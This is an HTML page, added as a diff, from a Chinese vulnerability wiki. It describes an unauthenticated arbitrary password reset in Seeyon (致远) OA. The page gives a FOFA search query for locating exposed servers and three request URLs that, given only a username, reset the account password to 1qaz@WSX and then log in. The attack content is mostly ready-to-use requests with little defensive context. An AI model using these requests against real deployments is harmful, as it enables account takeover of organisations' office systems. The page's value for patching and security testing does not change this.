@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9C%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>致远前台任意用户密码修改 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u81f4\u8fdc\u524d\u53f0\u4efb\u610f\u7528\u6237\u5bc6\u7801\u4fee\u6539", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_2", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E8%89%BE%E7%A7%91%E6%80%9D/%E8%89%BE%E7%A7%91%E6%80%9D%EF%BC%88%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80%EF%BC%89%E5%BA%94%E7%94%A8%E6%8E%A5%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E8%89%BE%E7%A7%91%E6%80%9D/%E8%89%BE%E7%A7%91%E6%80%9D%EF%BC%88%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80%EF%BC%89%E5%BA%94%E7%94%A8%E6%8E%A5%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        艾科思（霆智科技）应用接入系统存在任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E8%87%B4%E8%BF%9C%E4%BA%92%E8%81%94FE%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0ncsubjass%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E8%87%B4%E8%BF%9C%E4%BA%92%E8%81%94FE%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0ncsubjass%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        致远互联FE协作办公平台ncsubjass存在SQL注入
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="_1">致远前台任意用户密码修改<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>app=&quot;致远互联-OA&quot;
+</code></pre></div>
+<h2 id="_2">漏洞复现<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>前提需要知道用户名</p>
+<p><code>http://xx.xx.xx.xx/seeyon/personalBind.do?method=retrievePassword</code></p>
+<p><img width="1057" alt="image-20240301101704702" src="https://github.com/wy876/POC/assets/139549762/9562a165-151e-421c-a26c-7e09bf199368"></p>
+<p><code>http://xx.xx.xx.xx/seeyon/personalBind.do?method=sendVerificationCodeToBindNum&amp;type=validate&amp;origin=zx</code></p>
+<p><img width="1047" alt="image-20240301101722837" src="https://github.com/wy876/POC/assets/139549762/c1ea9e86-1a92-4aaa-945d-a1a45c83509e"></p>
+<p>修改密码为<code>1qaz@WSX</code></p>
+<p><code>http://xx.xx.xx.xx/seeyon/individualManager.do?method=resetPassword&amp;nowpwd=1qaz@WSX</code></p>
+<p><img width="1217" alt="image-20240301101802224" src="https://github.com/wy876/POC/assets/139549762/5375cccc-0a9b-4ae0-8e3e-177aa67290b1"></p>
+<p>最后使用修改的密码登录</p>
+<p><img width="1054" alt="image-20240301101840756" src="https://github.com/wy876/POC/assets/139549762/261afdc9-a728-4302-96a6-e0e19d02d338"></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E8%89%BE%E7%A7%91%E6%80%9D/%E8%89%BE%E7%A7%91%E6%80%9D%EF%BC%88%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80%EF%BC%89%E5%BA%94%E7%94%A8%E6%8E%A5%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E8%89%BE%E7%A7%91%E6%80%9D/%E8%89%BE%E7%A7%91%E6%80%9D%EF%BC%88%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80%EF%BC%89%E5%BA%94%E7%94%A8%E6%8E%A5%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        艾科思（霆智科技）应用接入系统存在任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E8%87%B4%E8%BF%9C%E4%BA%92%E8%81%94FE%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0ncsubjass%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E8%87%B4%E8%BF%9C%E4%BA%92%E8%81%94FE%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0ncsubjass%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        致远互联FE协作办公平台ncsubjass存在SQL注入
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
